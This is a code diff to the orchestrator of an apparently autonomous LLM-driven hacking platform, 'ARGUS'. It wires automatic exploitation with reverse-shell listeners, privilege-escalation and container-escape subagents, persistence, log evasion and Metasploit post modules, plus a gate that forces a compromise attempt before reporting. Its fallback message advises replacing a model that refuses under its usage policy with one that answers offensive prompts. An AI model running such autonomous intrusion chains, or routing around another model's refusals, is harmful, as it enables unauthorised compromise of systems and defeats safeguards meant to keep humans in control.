@@ -747,9 +747,13 @@ class MasterAgent(BaseAgent):
         use_reasoning_loop: bool = False,            # enable hypothesis-driven engine
         mission_brief:      Optional[Any] = None,    # Improvement #1 — formal mission
         objective:          str  = "",               # operator-supplied goal text
+        autonomy:           str  = "",               # operator-core autonomy for this scan
         **kwargs
     ) -> Dict:
         self._use_reasoning_loop = _REASONING_AVAILABLE  # Always use reasoning if available
+        # Per-scan operator autonomy (UI/selectable) overrides the env default.
+        self._operator_autonomy = (autonomy or "").strip().lower() or os.environ.get(
+            "ARGUS_OPERATOR_AUTONOMY", "approve_to_exploit")
         self._session_id     = session_id
         # Stash operator-supplied objective so the EngagementContext
         # init below picks it up.
@@ -926,17 +930,30 @@ class MasterAgent(BaseAgent):
         if _META_AGENTS_AVAILABLE and self._meta_agents_enabled:
             try:
                 _db_conn = db.get_db()
-                self._master_checker  = MasterCheckerAgent(
-                    broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
-                )
-                self._issue_validator = IssueValidatorAgent(
-                    broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
-                )
+                # Under the operator core, MasterChecker + IssueValidator are
+                # DEAD WEIGHT: they only run as pre/post-phase reviewers and the
+                # operator does not march phases, so they never fire.  Skip
+                # instantiating them.  The RedTeamExpert IS kept — the operator
+                # consults it every few iterations via _consult_advisors.
+                try:
+                    _op_driver = self._operator_core_enabled()
+                except Exception:
+                    _op_driver = False
+                if _op_driver:
+                    self._master_checker  = None
+                    self._issue_validator = None
+                else:
+                    self._master_checker  = MasterCheckerAgent(
+                        broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
+                    )
+                    self._issue_validator = IssueValidatorAgent(
+                        broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
+                    )
+                    self._master_checker._session_id  = session_id
+                    self._issue_validator._session_id = session_id
                 self._expert = RedTeamExpertAgent(
                     broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
                 )
-                self._master_checker._session_id  = session_id
-                self._issue_validator._session_id = session_id
                 self._expert._session_id          = session_id
                 # Expert needs a back-reference so it can push directives into the
                 # master's guidance queue (inject_guidance).
@@ -1508,6 +1525,31 @@ class MasterAgent(BaseAgent):
         except Exception as _exc:
             logger.warning("episodic memory record failed: %s", _exc)
 
+        # Continuous learning — distil this engagement's GENUINE, confirmed-working
+        # techniques into the RAG so future scans benefit from hard-won experience.
+        # Double-gated: only an engagement that PROVED something (foothold / flag /
+        # cred / privesc / confirmed vuln) contributes, and only confirmed,
+        # reusable techniques are stored — NEVER raw scan findings.  Best-effort;
+        # never blocks finalize.  Disable with ARGUS_RAG_LEARNING=0.
+        try:
+            if os.environ.get("ARGUS_RAG_LEARNING", "1") != "0":
+                from agents.reasoning.lesson_distiller import distill_and_store
+                # FIRE-AND-FORGET: the engagement is already complete and recorded
+                # above.  Learning runs in the BACKGROUND so it can NEVER delay or
+                # block finalize, hang the server, or affect the pentest outcome —
+                # finalize returns instantly exactly as before.  The distiller is
+                # self-wrapped and returns 0 on any error, so the unawaited task
+                # cannot raise into the loop either.
+                asyncio.ensure_future(distill_and_store(
+                    master      = self,
+                    intel       = self._intel,
+                    session_id  = session_id,
+                    target      = target,
+                    target_type = (self._intel.get("target_type")
+                                   or (plan or {}).get("assessment_type") or "unknown")))
+        except Exception as _lexc:
+            logger.warning("RAG lesson distillation failed to schedule: %s", _lexc)
+
         await self._emit("pentest_complete", {
             "session_id": session_id,
             "intel":      self._intel,
@@ -1849,13 +1891,23 @@ class MasterAgent(BaseAgent):
             await self._emit("meta_correction", {**c.to_dict(), "tier": "advisory"})
 
         for c in blocking:
+            # C7 — a "blocking" correction must actually reach the planner, not
+            # merely emit an event (the old behaviour: `allow_replan` /
+            # MAX_REPLAN_RETRIES were dead code, so "blocking" had LESS effect
+            # than "advisory").  Inject it into the advisory context as a
+            # MANDATORY line so it surfaces — weighted above advisories — in the
+            # next planning prompt.
+            note = f"[MANDATORY|{c.source}|{c.phase}] {c.description} → {c.recommended_action}"
+            self._meta_advisory_context.append(note)
+            if _META_AGENTS_AVAILABLE and len(self._meta_advisory_context) > MAX_ADVISORY_CONTEXT:
+                self._meta_advisory_context = self._meta_advisory_context[-MAX_ADVISORY_CONTEXT:]
             await self._emit("meta_correction", {**c.to_dict(), "tier": "blocking"})
             try:
                 await self.emit_reasoning(
                     step      = f"meta_blocking_{phase}",
                     reasoning = f"BLOCKING correction from {c.source}: {c.description}",
                     decision  = c.recommended_action,
-                    next_action="Re-evaluate before proceeding",
+                    next_action="Injected as MANDATORY context for the next planning step",
                 )
             except Exception:
                 pass
@@ -1907,13 +1959,7 @@ class MasterAgent(BaseAgent):
         if not self._session_id:
             return None
         try:
-            # MongoDB requires all document keys to be strings. The services dict
-            # uses port numbers as keys (e.g. {21: {...}, 80: {...}}); stringify them.
-            _intel_snap = dict(self._intel)
-            if isinstance(_intel_snap.get("services"), dict):
-                _intel_snap["services"] = {
-                    str(k): v for k, v in _intel_snap["services"].items()
-                }
+            _raw_snap = dict(self._intel)
             # B-6 — augment the snapshot with exfil-pipeline state so the
             # report generator can render the Loot / Web-Intel / Primer
             # sections.  Without these, the new report sections would
@@ -1921,14 +1967,35 @@ class MasterAgent(BaseAgent):
             try:
                 xp = getattr(self, "_exfil_pipeline", None)
                 if xp is not None:
-                    _intel_snap["loot_entries"] = xp.list_entries()
-                    _intel_snap["loot_summary"] = xp.manifest_summary()
+                    _raw_snap["loot_entries"] = xp.list_entries()
+                    _raw_snap["loot_summary"] = xp.manifest_summary()
             except Exception:
                 pass
-            # Mongo cannot serialise sets — convert any "_*_fired" sets to lists.
-            for k, v in list(_intel_snap.items()):
-                if isinstance(v, set):
-                    _intel_snap[k] = sorted(v)
+            # MongoDB requires ALL document keys to be strings and can't store
+            # sets.  intel has several int-keyed dicts (services {22:…},
+            # service_versions {22:…}, banners {…}); a shallow services-only
+            # fix left service_versions int keys → "key was 22" crash on save.
+            # Deep-sanitise the whole snapshot once.
+            def _mongo_safe(obj):
+                if isinstance(obj, dict):
+                    return {str(k): _mongo_safe(v) for k, v in obj.items()}
+                if isinstance(obj, (list, tuple)):
+                    return [_mongo_safe(x) for x in obj]
+                if isinstance(obj, set):
+                    return [_mongo_safe(x) for x in obj]
+                # Only BSON-encodable primitives pass through.  Anything else
+                # (BoundedInstructionCache, callables, custom objects) was
+                # crashing EVERY checkpoint save — "cannot encode object" — so
+                # objective/answer state NEVER persisted.  Stringify the rest.
+                import datetime as _dt
+                if isinstance(obj, (str, int, float, bool, bytes)) or obj is None:
+                    return obj
+                if isinstance(obj, _dt.datetime):
+                    return obj
+                if isinstance(obj, _dt.date):
+                    return obj.isoformat()
+                return f"<{type(obj).__name__}>"
+            _intel_snap = _mongo_safe(_raw_snap)
             cid = await db.store_checkpoint(
                 session_id            = self._session_id,
                 host                  = self._target,
@@ -2098,6 +2165,21 @@ class MasterAgent(BaseAgent):
             await self._await_and_sync_subagents(coros, phase="vuln", timeout=240.0)
 
         elif phase == "exploit":
+            # C10/C4 — only ONE ExploitOrchestrator at a time per engagement.
+            # _phase_exploit (reachable from bootstrap, stall-escalation AND the
+            # compromise-gate) and the entry-attempt dispatcher's
+            # _attempt_exploit_for_cves both launch orchestrators; running them
+            # concurrently races the same CVEs/target (duplicate network load,
+            # competing first-to-win shells).  Skip if one is already in flight.
+            if getattr(self, "_exploit_orch_active", False):
+                await self.emit_reasoning(
+                    step       = "exploit_orch_dedup",
+                    reasoning  = ("An ExploitOrchestrator is already running for "
+                                  "this engagement — not launching a duplicate."),
+                    decision   = "SKIP duplicate concurrent orchestrator",
+                    next_action= "Let the in-flight orchestrator finish",
+                )
+                return
             from agents.exploit.exploit_orchestrator  import ExploitOrchestrator
             orch = ExploitOrchestrator(broadcast=sa_broadcast)
             orch._session_id = sid
@@ -2108,39 +2190,96 @@ class MasterAgent(BaseAgent):
             lhost = kwargs.get("lhost") or (lm.lhost if lm else None) or self._auto_detect_lhost()
             lport = int(kwargs.get("lport") or 4444)
 
-            await self._await_and_sync_subagents(
-                [orch.run(
-                    session_id   = sid,
-                    target       = target,
-                    db           = _db.get_db(),
-                    services     = list(self._intel.get("services", {}).values()),
-                    cves         = self._intel.get("cves", []),
-                    open_ports   = self._intel.get("open_ports", []),
-                    web_urls     = [
-                        f"http{'s' if int(str(p)) in (443,8443) else ''}://{target}:{p}"
-                        for p, s in self._intel.get("services",{}).items()
-                        if any(x in (s.get("service","") if isinstance(s,dict) else str(s)).lower()
-                               for x in ("http","https"))
-                    ][:3],
-                    lhost        = lhost,
-                    lport        = lport,
-                )],
-                phase="exploit", timeout=600.0,
-            )
+            self._exploit_orch_active = True
+            try:
+                await self._await_and_sync_subagents(
+                    [orch.run(
+                        session_id   = sid,
+                        target       = target,
+                        db           = _db.get_db(),
+                        services     = list(self._intel.get("services", {}).values()),
+                        cves         = self._intel.get("cves", []),
+                        open_ports   = self._intel.get("open_ports", []),
+                        web_urls     = [
+                            f"http{'s' if int(str(p)) in (443,8443) else ''}://{target}:{p}"
+                            for p, s in self._intel.get("services",{}).items()
+                            if any(x in (s.get("service","") if isinstance(s,dict) else str(s)).lower()
+                                   for x in ("http","https"))
+                        ][:3],
+                        lhost        = lhost,
+                        lport        = lport,
+                    )],
+                    phase="exploit", timeout=600.0,
+                )
+            finally:
+                self._exploit_orch_active = False
 
         elif phase == "privesc":
+            # ── ENUMERATE → then actually EXPLOIT ────────────────────────────
+            # Previously this only ran the ENUM subagents; the matching EXPLOIT
+            # subagents (linux/windows escalation, container escape, cloud-meta)
+            # were defined but ORPHANED — so privesc discovered vectors and then
+            # did nothing with them.  Now we enumerate, feed the results into the
+            # OS-appropriate exploit subagent, and add container/cloud escalation
+            # when detected.  (This whole phase is already gated on shell_access.)
             from agents.privesc.linux_enum_subagent    import LinuxEnumSubagent
             from agents.privesc.windows_enum_subagent  import WindowsEnumSubagent
             kw    = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())
             os_guess = self._intel.get("os_guess", "").lower()
-            if "windows" in os_guess:
-                await self._await_and_sync_subagents(
-                    [WindowsEnumSubagent(**kw).execute()], phase="privesc", timeout=240.0,
-                )
+            _is_win  = "windows" in os_guess
+            lm    = getattr(self, "listener_manager", None)
+            lhost = (getattr(lm, "lhost", None) if lm else None) or self._auto_detect_lhost()
+            lport = 4445
+
+            # 1) Enumerate (capture parsed_data to feed the exploit subagent)
+            if _is_win:
+                enum_res = await WindowsEnumSubagent(**kw).execute()
             else:
-                await self._await_and_sync_subagents(
-                    [LinuxEnumSubagent(**kw).execute()], phase="privesc", timeout=240.0,
-                )
+                enum_res = await LinuxEnumSubagent(**kw).execute()
+            _er = getattr(enum_res, "parsed_data", {}) or {}
+
+            # 2) Exploit — escalate from the enumerated vectors
+            coros = []
+            try:
+                if _is_win:
+                    from agents.privesc.windows_exploit_subagent import WindowsExploitSubagent
+                    coros.append(WindowsExploitSubagent(**kw).execute(
+                        lhost=lhost, lport=lport, enum_results=_er))
+                else:
+                    from agents.privesc.linux_exploit_subagent import LinuxExploitSubagent
+                    coros.append(LinuxExploitSubagent(**kw).execute(enum_results=_er))
+            except Exception as _ie:
+                await self.emit_reasoning(
+                    step="privesc_exploit_unavailable",
+                    reasoning=f"privesc exploit subagent import failed: {_ie}",
+                    decision="Continue with enum findings only", next_action="")
+
+            # 3) Container escape + cloud-metadata — detection-gated
+            _blob = (str(self._intel.get("os_guess", "")) + " "
+                     + " ".join(str(v) for v in (self._intel.get("services") or {}).values())
+                     + " " + " ".join(str(v) for v in _er.values()
+                                       if isinstance(v, (str, int, float)))).lower()
+            try:
+                if self._intel.get("container_info") or any(
+                        s in _blob for s in ("docker", "containerd", "lxc",
+                                             "kubernetes", "dockerenv")):
+                    from agents.privesc.container_escape_subagent import ContainerEscapeSubagent
+                    coros.append(ContainerEscapeSubagent(**kw).execute())
+            except Exception:
+                pass
+            try:
+                _cloud = self._intel.get("cloud") or (
+                    "aws" if ("ec2" in _blob or "amazon" in _blob) else
+                    "gcp" if "google" in _blob else
+                    "azure" if "azure" in _blob else "")
+                if _cloud:
+                    from agents.privesc.cloud_meta_subagent import CloudMetaSubagent
+                    coros.append(CloudMetaSubagent(**kw).execute(cloud=_cloud))
+            except Exception:
+                pass
+
+            if coros:
+                await self._await_and_sync_subagents(coros, phase="privesc", timeout=360.0)
 
         elif phase == "web":
             from agents.web.dir_fuzz_subagent                  import DirFuzzSubagent
@@ -2152,6 +2291,7 @@ class MasterAgent(BaseAgent):
             from agents.web.crypto_failures_subagent           import CryptoFailuresSubagent
             from agents.web.insecure_design_subagent           import InsecureDesignSubagent
             from agents.web.data_integrity_subagent            import DataIntegritySubagent
+            from agents.web.owasp2025_native_probes            import OWASP2025NativeProbesSubagent
             from agents.web.injection_subagent                 import InjectionSubagent
             from agents.web.auth_bypass_subagent               import AuthBypassSubagent
             from agents.web.cms_subagent                       import CmsSubagent
@@ -2194,6 +2334,7 @@ class MasterAgent(BaseAgent):
                     CryptoFailuresSubagent(**kw).execute(url=url),
                     InsecureDesignSubagent(**kw).execute(url=url),
                     DataIntegritySubagent(**kw).execute(url=url),
+                    OWASP2025NativeProbesSubagent(**kw).execute(url=url),
                 ]
                 if url.startswith("https"):
                     coros.append(SsrfSubagent(**kw).execute(url=url))
@@ -2225,6 +2366,25 @@ class MasterAgent(BaseAgent):
                     PersistenceSubagent(**kw).execute(shell_id=shell_id),
                     LogEvasionSubagent(**kw).execute(shell_id=shell_id),
                 ]
+            # Metasploit post modules — only meaningful with an active MSF /
+            # meterpreter session (else it has nothing to attach to).  Wired
+            # conditionally so it's integrated-when-applicable, not orphaned.
+            try:
+                _msf_shell = next(
+                    (s for s in shells if isinstance(s, dict) and any(
+                        k in str(s.get("method", "")) + str(s.get("source", "")).lower()
+                        for k in ("meterpreter", "metasploit"))),
+                    None)
+                if _msf_shell:
+                    from agents.exploit.post_module_subagent import PostModuleSubagent
+                    _ost = ("windows" if "windows" in self._intel.get("os_guess", "").lower()
+                            else "linux")
+                    coros.append(PostModuleSubagent(**kw).execute(
+                        os_type=_ost,
+                        session_id_msf=str(_msf_shell.get("msf_session")
+                                           or _msf_shell.get("session_id") or "1")))
+            except Exception:
+                pass
             await self._await_and_sync_subagents(coros, phase="post", timeout=300.0)
 
         elif phase == "lateral":
@@ -2380,7 +2540,7 @@ class MasterAgent(BaseAgent):
                       "domain", "dc_ip", "interesting_files", "banners",
                       "service_versions", "shells"}
         LIST_KEYS  = {"cves", "vulnerabilities", "exploits", "web_vulns",
-                      "login_pages", "subdomains"}
+                      "login_pages", "subdomains", "web_targets"}
 
         for res in results:
             if res is None or isinstance(res, Exception):
@@ -2534,6 +2694,56 @@ class MasterAgent(BaseAgent):
         # Restore score from checkpoint
         self._decision_engine.set_score(self._intel.get("action_score", 0))
 
+    async def _note_operator_fallback(self, reason: str, detail: str) -> None:
+        """Make an operator→legacy fallback VISIBLE on the findings page + feed.
+
+        Without this, when the operator core can't start (e.g. its first
+        reasoning call comes back empty), ARGUS silently runs the weaker legacy
+        phase pipeline and the user is left wondering why 'the operator did
+        nothing'.  Best-effort; never raises."""
+        try:
+            fn = getattr(self, "store_finding", None)
+            if fn is None:
+                return
+            msg = (
+                "The operator core could not start its reasoning loop "
+                f"({reason}: {detail}). ARGUS ran the LEGACY phase pipeline "
+                "instead — a weaker, less-targeted engagement that does NOT "
+                "weaponize the CVE/PoC leads. Check the reasoning LLM: a primary "
+                "policy refusal (claude-code Usage Policy) or a local model "
+                "overflowing its context window are the usual causes. Set "
+                "LLM_PROVIDER to a model that answers offensive-but-authorized "
+                "prompts and/or raise OLLAMA_NUM_CTX, then re-run.")
+            sev = "MEDIUM"
+            try:
+                from schemas import FindingSeverity as _FS
+                sev = getattr(_FS, "MEDIUM", "MEDIUM")
+            except Exception:
+                pass
+            await fn(severity=sev,
+                     title="Operator core unavailable — legacy fallback engaged",
+                     description=msg, host=getattr(self, "_target", "") or "",
+                     tool_used="operator_core", cves=[], evidence=detail)
+        except Exception:
+            pass
+
+    def _operator_core_enabled(self) -> bool:
+        """Whether the persistent operator core drives this engagement.
+
+        Default ON (the inversion: the operator agent drives; phases/subagents
+        are its callable services).  Kill-switch: ARGUS_OPERATOR=0 (or off/false)
+        forces the legacy ReasoningLoop.  Import-guarded so a broken/absent
+        operator package degrades to legacy rather than crashing.
+        """
+        v = os.environ.get("ARGUS_OPERATOR", "1").strip().lower()
+        if v in ("0", "off", "false", "no", "disabled"):
+            return False
+        try:
+            import agents.operator_agent.operator_core  # noqa: F401
+            return True
+        except Exception:
+            return False
+
     async def _reasoning_loop_run(
         self,
         session_id:  str,
@@ -2542,9 +2752,15 @@ class MasterAgent(BaseAgent):
         resume_from: Optional[str] = None,
     ) -> None:
         """
-        Run the hypothesis-driven reasoning loop.
-        Called from _execute_phases() when use_reasoning_loop=True.
-        Propagates final intel back to self._intel for reporting.
+        Run the engagement's reasoning driver.
+
+        DEFAULT: the persistent operator core (agents.operator_agent) — a single
+        long-lived ReAct agent that owns the engagement with an accumulating
+        transcript + the full toolbelt.  The legacy hypothesis-driven
+        ReasoningLoop is retained as an AUTOMATIC FALLBACK: if the operator LLM
+        is unavailable (OperatorUnavailable) or the operator errors, the engine
+        falls through to it.  Either way, final intel propagates to self._intel
+        for reporting.
         """
         if not _REASONING_AVAILABLE:
             return
@@ -2577,23 +2793,129 @@ class MasterAgent(BaseAgent):
         # rather than waiting for the next (slow) decision cycle.  The
         # dispatcher polls ctx.detect_entry_points() every 30s and also
         # wakes instantly on new-entry events.
-        _entry_task = None
-        if self._context is not None:
-            try:
-                _entry_task = self._create_task(
-                    self._entry_attempt_dispatcher(target)
-                )
-            except Exception:
-                _entry_task = None
+        # When the operator core drives, it owns exploitation timing and honours
+        # the approve-to-exploit gate — so the auto-fire reactive dispatcher must
+        # NOT run alongside it (it would launch exploits without operator
+        # consent).  Under the legacy loop (or operator fallback) it runs as before.
+        use_operator = self._operator_core_enabled()
 
-        # Run the loop — returns updated intel
+        _entry_task = None
+
+        def _start_entry_dispatcher():
+            nonlocal _entry_task
+            if self._context is not None and _entry_task is None:
+                try:
+                    _entry_task = self._create_task(
+                        self._entry_attempt_dispatcher(target)
+                    )
+                except Exception:
+                    _entry_task = None
+
+        if not use_operator:
+            _start_entry_dispatcher()
+
+        # ── Error Analyzer (DEFAULT-path startup) ─────────────────────────
+        # Same bug class as the entry dispatcher: it was only started on the
+        # legacy pipeline, so in the DEFAULT reasoning-loop engine it NEVER ran
+        # — the platform looped on broken tools (curl "cannot execute binary
+        # file", arjun timeouts, dalfox-not-found, …) with zero triage.  Start
+        # + register it here so every tool error is LLM-classified in real time.
+        _err_task = None
         try:
-            final_intel = await loop.run()
+            from agents.meta.error_analyzer_agent import (
+                ErrorAnalyzerAgent, register_analyzer)
+            if getattr(self, "_error_analyzer", None) is None:
+                try:
+                    _ea_db = db.get_db()
+                except Exception:
+                    _ea_db = None
+                self._error_analyzer = ErrorAnalyzerAgent(
+                    broadcast=self.broadcast, session_id=session_id,
+                    db_conn=_ea_db, enabled=True)
+                register_analyzer(self._error_analyzer)
+            _err_task = self._create_task(self._error_analyzer.run())
+        except Exception as _eaerr:
+            import logging as _l
+            _l.getLogger(__name__).warning(
+                "[error_analyzer] default-path start failed (non-fatal): %s", _eaerr)
+            _err_task = None
+
+        # Run the driver — operator core first, legacy ReasoningLoop as fallback.
+        # One-time TRUTH banner: print what is ACTUALLY driving this engagement.
+        # The per-call logs historically stamped a static MODEL_NAME constant (a
+        # baked-in phantom default when nothing was configured) — this
+        # resolves the live provider so the operator can SEE the real backend,
+        # model, and backup instead of trusting a misleading model column.
+        try:
+            import logging as _ll
+            from utils.llm_providers import (get_provider as _gp,
+                                             get_fallback_provider as _gfp)
+            _pp = _gp(); _fb = _gfp()
+            _prim = f"{_pp.name}/{getattr(_pp, 'model', '') or '(no model set!)'}"
+            if _fb is not None:
+                _back = f"{_fb.name}/{getattr(_fb, 'model', '')}"
+            elif _pp.name != "ollama":
+                _back = "ollama (implicit local backup)"
+            else:
+                _back = "none"
+            _ll.getLogger(__name__).info(
+                "[llm] RESOLVED — primary=%s  backup=%s", _prim, _back)
+            await self._emit("llm_resolved", {
+                "session_id": session_id, "primary": _prim, "backup": _back})
+        except Exception:
+            pass
+
+        try:
+            final_intel = None
+            if use_operator:
+                try:
+                    from agents.operator_agent.operator_core import (
+                        OperatorCore, OperatorUnavailable)
+                    autonomy = (getattr(self, "_operator_autonomy", "") or
+                                os.environ.get("ARGUS_OPERATOR_AUTONOMY", "approve_to_exploit"))
+                    op = OperatorCore(self, autonomy=autonomy)
+                    self._operator_core_inst = op
+                    await self._emit("operator_core_start", {
+                        "session_id": session_id, "target": target,
+                        "autonomy": autonomy})
+                    op_result = await op.run()
+                    final_intel = self._intel   # operator mutates shared intel in place
+                    await self._emit("operator_core_done", {
+                        "session_id": session_id, "result": op_result})
+                except OperatorUnavailable as _ou:
+                    await self._emit("operator_core_fallback", {
+                        "session_id": session_id, "reason": "llm_unavailable",
+                        "detail": str(_ou)})
+                    await self._note_operator_fallback("llm_unavailable", str(_ou))
+                    final_intel = None
+                except Exception as _oe:   # noqa: BLE001 — never crash the engine
+                    import logging as _l
+                    _l.getLogger(__name__).warning(
+                        "[operator] core errored → legacy fallback: %s: %s",
+                        type(_oe).__name__, _oe)
+                    await self._emit("operator_core_fallback", {
+                        "session_id": session_id, "reason": "error",
+                        "detail": f"{type(_oe).__name__}: {_oe}"})
+                    await self._note_operator_fallback("error", f"{type(_oe).__name__}: {_oe}")
+                    final_intel = None
+
+            if final_intel is None:
+                # Legacy ReasoningLoop (operator disabled, unavailable, or errored).
+                # Start the reactive dispatcher now if the operator pre-empted it.
+                if use_operator:
+                    _start_entry_dispatcher()
+                final_intel = await loop.run()
         finally:
-            # Stop the reactive dispatcher once the loop exits (it also
-            # self-terminates when the engagement reaches post_exploit).
+            # Stop the reactive dispatcher + error analyzer once the loop exits
+            # (the dispatcher also self-terminates at post_exploit).
             if _entry_task is not None and not _entry_task.done():
                 _entry_task.cancel()
+            if _err_task is not None and not _err_task.done():
+                try:
+                    self._error_analyzer.request_stop()
+                except Exception:
+                    pass
+                _err_task.cancel()
 
         # Merge final reasoning state back into self._intel
         for key in [
@@ -2918,6 +3240,21 @@ class MasterAgent(BaseAgent):
         # Avoid breaking PowerShell pipelines — use `; ` for cmd/PS and
         # `\n` for bash; both shells accept the bash form harmlessly.
         wrapped = wrapped + f"\necho {sentinel}\n"
+
+        # Operator visibility: surface the command ARGUS is about to run in the
+        # shared session so the human sees ARGUS's post-exploitation activity in
+        # the event feed (the live stdout already streams to their terminal via
+        # the shared ShellAgent's shell_output broadcast).
+        try:
+            await self._emit("agent_shell_command", {
+                "session_id": self._session_id,
+                "shell_id":   shell_id,
+                "command":    command,
+                "purpose":    purpose,
+                "actor":      "argus",
+            })
+        except Exception:
+            pass
 
         try:
             # Send the command into the PTY
@@ -3367,6 +3704,46 @@ class MasterAgent(BaseAgent):
                 "circuit_breaker": True,
             }
 
+        # ── OPERATOR FAST PATH (speed) ───────────────────────────────────────
+        # When the operator core dispatches a tool it reads the raw output
+        # itself, so run the tool DIRECTLY via run_tool — NO specialist/cluster
+        # agent spin-up and NO per-tool "extract findings" LLM call (that tax was
+        # ~40% of all LLM calls in the logs).  This also makes every specialist +
+        # specialist-cluster agent (cloud/container/iot/wireless/evasion/
+        # forensics/traffic) fallback-only — they no longer fire on the operator
+        # path.  run_tool keeps every safety guard (hosts-guard, blacklist,
+        # OPSEC) + GUI streaming.  Cheap LLM-free recon enrichment + dedup of
+        # expensive scans (the 4-6× nmap -p- problem) ride along.
+        if phase == "operator":
+            _DEDUP_TOOLS = frozenset({
+                "nmap", "rustscan", "masscan", "gobuster", "ffuf", "feroxbuster",
+                "dirb", "dirsearch", "wfuzz", "nikto", "nuclei", "whatweb",
+            })
+            cache = self._intel.setdefault("_tool_cache", {})
+            ckey = f"{tool}::{args}"
+            if tool.lower() in _DEDUP_TOOLS and ckey in cache:
+                cached = dict(cache[ckey]); cached["cached"] = True
+                return cached
+            res = await self.run_tool(tool, args or self._target,
+                                      target=self._target, timeout=timeout)
+            out = {
+                "stdout":    (res.get("stdout") or "")[:65536],
+                "stderr":    res.get("stderr", ""),
+                "exit_code": res.get("exit_code", 0),
+                "output_id": res.get("output_id", ""),
+                "tool":      tool, "args": args,
+            }
+            try:
+                self._cheap_intel_merge(tool, out["stdout"])
+            except Exception:
+                pass
+            self._record_dispatch_outcome(
+                cb_key, productive=bool(out["stdout"] and out["exit_code"] == 0))
+            if (tool.lower() in _DEDUP_TOOLS and out["exit_code"] == 0
+                    and out["stdout"]):
+                cache[ckey] = out
+            return out
+
         agent_type = self._classify_tool_to_phase(tool)
         task = {
             "tool":         tool,
@@ -3530,6 +3907,30 @@ class MasterAgent(BaseAgent):
                 "output_id": "",
                 "error":     str(e),
             }
+
+    def _cheap_intel_merge(self, tool: str, stdout: str) -> None:
+        """LLM-free intel enrichment for the operator fast path.
+
+        Parses nmap/rustscan-style open-port + service/version lines into
+        intel['open_ports'] and intel['services'] so the GUI, the operator brief,
+        and the CVE auto-seed still populate — WITHOUT the per-tool 'extract
+        findings' LLM call.  Pure regex; never raises into the caller."""
+        if not stdout:
+            return
+        import re as _re
+        tl = (tool or "").lower()
+        if tl in ("nmap", "rustscan", "masscan"):
+            ports = self._intel.setdefault("open_ports", [])
+            svcs = self._intel.setdefault("services", {})
+            have = {str(p.get("port") if isinstance(p, dict) else p) for p in ports}
+            for m in _re.finditer(
+                    r"(?m)^(\d{1,5})/tcp\s+open\s+(\S+)(?:\s+(.*))?$", stdout):
+                pn, svc, ver = m.group(1), m.group(2), (m.group(3) or "").strip()
+                if pn not in have:
+                    ports.append({"port": int(pn), "service": svc, "version": ver})
+                    have.add(pn)
+                svcs[pn] = {"service": svc, "version": ver,
+                            "protocol": "tcp", "port": int(pn)}
 
     def _record_dispatch_outcome(self, cb_key, *, productive: bool) -> None:
         """Update the circuit-breaker counter for a (tool, target) pair.
@@ -3776,6 +4177,8 @@ class MasterAgent(BaseAgent):
             "exploit_orchestrator:",
             "web_exploit:",
             "credential_spray:",
+            "exploit_synth",  # Tier-2 LLM synthesis — must show real shell evidence,
+            "exploit_lab",    # not a self-declared "success" string / web-enum output
         )
         if any(source.startswith(p) for p in _OPTIMISTIC_SOURCE_PREFIXES):
             _OPTIMISTIC_SOURCES = _OPTIMISTIC_SOURCES | {source}
@@ -4151,6 +4554,14 @@ class MasterAgent(BaseAgent):
             # session-end teardown / DB updates.
             try:
                 await self._wait_for_agents_idle(timeout=120.0)
+            except Exception:
+                pass
+            # ── COMPROMISE-READINESS GATE ───────────────────────────────
+            # ARGUS exists to COMPROMISE, not to file a CVE list.  If the run
+            # achieved no shell / flag / harvested creds / verified exploit,
+            # force ONE final genuine exploitation pass before reporting.
+            try:
+                await self._final_compromise_gate(session_id, target)
             except Exception:
                 pass
             try:
@@ -4725,6 +5136,12 @@ class MasterAgent(BaseAgent):
             await self._phase_forensics_deep(target)
             self._phases_completed.append("forensics")
 
+        # ── COMPROMISE-READINESS GATE (force a real foothold attempt) ──────
+        try:
+            await self._final_compromise_gate(session_id, target)
+        except Exception:
+            pass
+
         await self._phase_evidence_collection(session_id, target)
 
         # ── PHASE 9: REPORT GENERATION ────────────────────────
@@ -4936,6 +5353,16 @@ class MasterAgent(BaseAgent):
         new_os = (result.get("os_guess") or "").strip()
         if new_os and new_os != "unknown":
             self._intel["os_guess"] = new_os
+        # nmap -O is root-only and often does not run; if the scan-supplied
+        # guess is still unknown, derive it from the -sV service banners +
+        # open-port fingerprint so EVERY downstream tech-specific stage
+        # (payload, shell, privesc, lateral/AD) routes correctly instead of
+        # silently defaulting to Linux.
+        if (self._intel.get("os_guess") or "unknown").strip().lower() in ("", "unknown"):
+            try:
+                self._detect_target_os()
+            except Exception:
+                pass
         new_paths = result.get("web_paths") or []
         if new_paths:
             cur_paths = list(self._intel.get("web_paths") or [])
@@ -5010,6 +5437,32 @@ class MasterAgent(BaseAgent):
             _l.getLogger(__name__).warning(
                 "device classifier failed (non-fatal): %s", _cl_err,
             )
+
+        # ── Version inference from leaked distro banners (advisory) ───────
+        # When a service hides its version (e.g. "Apache httpd" with no number)
+        # but a sibling banner leaks the distro (OpenSSH's Ubuntu suffix), infer
+        # the shipped package version to sharpen CVE matching downstream.
+        try:
+            from agents.exploit.exploitability import infer_distro_versions
+            _ev = " ".join(
+                str(v.get("version", "") if isinstance(v, dict) else v)
+                for v in (self._intel.get("services") or {}).values()
+            ) + " " + str(self._intel.get("os_guess", ""))
+            _inf = infer_distro_versions(_ev)
+            if _inf:
+                self._intel["inferred_versions"] = _inf
+                await self.emit_reasoning(
+                    step       = "version_inference",
+                    reasoning  = (
+                        f"Banner leaks {_inf['distro']} → likely package versions: "
+                        + ", ".join(f"{k} {v}" for k, v in _inf["versions"].items())
+                    ),
+                    decision   = "Use distro-default versions to sharpen CVE matching "
+                                 "for services that hide their banner",
+                    next_action= "Feed inferred versions into vuln/OSINT CVE search",
+                )
+        except Exception:
+            pass
 
         # ── Round 2: Master plans service-specific enumeration ─
         ports = self._intel["open_ports"]
@@ -5308,6 +5761,42 @@ class MasterAgent(BaseAgent):
                 return
 
         await self._apply_pending_guidance()
+
+        # ── Vhost pre-probe ─────────────────────────────────────────────
+        # Resolve IP→vhost BEFORE any web battery runs, so EVERY web tool
+        # targets the real app instead of racing the bare IP (which only
+        # 302-redirects to e.g. cctv.htb).  Deterministic single -I probe,
+        # parsed for an internal-vhost redirect, recorded via the central
+        # resolver.  Done inline (NOT via _dispatch_to_agent) so it can't
+        # trigger the WebAgent battery prematurely.
+        try:
